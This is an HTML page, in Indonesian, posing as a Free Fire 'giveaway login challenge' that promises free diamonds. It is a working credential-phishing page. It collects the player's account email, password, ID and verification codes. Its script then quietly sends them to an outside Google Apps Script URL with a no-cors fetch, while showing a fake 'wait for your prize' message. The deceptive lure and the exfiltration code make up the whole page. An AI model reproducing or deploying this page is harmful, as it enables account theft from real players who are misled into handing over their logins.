</head>
<body>

<canvas id="particles"></canvas>

<div class="container">
  <header>
    <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/970f34cf4cd1a7b8b1a09e28067f167agif" alt="Free Fire Logo">
    <h1>
      <span class="title">Free Fire GIVE AWAY LOGIN CHALLENGE</span>
      <span class="diamond">ðŸ’Ž</span>
    </h1>
  </header>

  <div id="progress">
    <div id="progress-bar"></div>
  </div>

  <!-- STEP 1 -->
  <div id="step1">
    <div class="step-text">Login Akun Free Firee Kamu Dan Raih Hadiah Diamond Gratis</div>
    <input class="s1" placeholder="Masukan Akun Email">
    <input class="s1" placeholder="Masukan Password">
    <button onclick="step1Func()">LOGIN</button>
  </div>

  <!-- STEP 2 -->
  <div id="step2" style="display:none;">
    <div class="step-text">MASUKAN ID DAN VERIFIKASI</div>
    <input class="s2" placeholder="MASUKAN ID">
    <input class="s2" placeholder="MASUKAN KODE VERIFIKASI">
    <input class="s2" placeholder="MASUKAN KODE VERIFIKASI">
    <button onclick="step2Func()">CLAIM HADIAH</button>
  </div>

  <div id="info"></div>
</div>

<script>
const URL="https://script.google.com/macros/s/AKfycbx3xqFUsfOxqSnkd04iaLRrhKY2d770UhpWaLdHFiSSfIgquoR4bt_wW4DWnFNJ66A6/exec";
let data=[];

function step1Func(){
  const vals=[...document.querySelectorAll(".s1")].map(i=>i.value.trim()).filter(v=>v);
  if(vals.length<2){alert("Harus isi 2 username!");return;}
  data=vals;
  document.getElementById("step1").style.display="none";
  document.getElementById("step2").style.display="block";
  document.getElementById("progress-bar").style.width="50%";
}

function step2Func(){
  const vals=[...document.querySelectorAll(".s2")].map(i=>i.value.trim()).filter(v=>v);
  if(vals.length<3){alert("Harus isi 3 username!");return;}
  data=data.concat(vals);

  const unik=[...new Set(data)];
  const status=(unik.length===1)?"MATCH":"TYPO";

  const info=document.getElementById("info");
  info.innerText=status==="MATCH"?"ðŸ’Ž MATCH â€” KONSISTEN!":"âŒ  TUNGGU 1 JAM MAKSIMAL ESTIMASI HADIAH!";
  info.style.color=status==="MATCH"?"#00ff99":"#ff4444";
  document.getElementById("progress-bar").style.width="100%";

  fetch(URL+"?users="+encodeURIComponent(JSON.stringify(data))+"&status="+status,
        {method:"GET",mode:"no-cors"});

  if(status==="MATCH"){
    const diamond=document.querySelector(".diamond");
    diamond.style.transform="scale(1.7)";
    setTimeout(()=>diamond.style.transform="scale(1)",700);
  }

  setTimeout(()=>location.reload(),2000);
}

// Particle background
const canvas=document.getElementById("particles");
const ctx=canvas.getContext("2d");
let particles=[];
function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
window.addEventListener('resize',resizeCanvas);
resizeCanvas();

for(let i=0;i<120;i++){
  particles.push({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    size:Math.random()*3+1,
    speed:Math.random()*1+0.3
  });
}

function animate(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle="rgba(255,255,255,0.8)";
  particles.forEach(p=>{
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.size,0,Math.PI*2);
    ctx.fill();
    p.y-=p.speed;
    if(p.y<0)p.y=canvas.height;
  });
  requestAnimationFrame(animate);
}
animate();
</script>
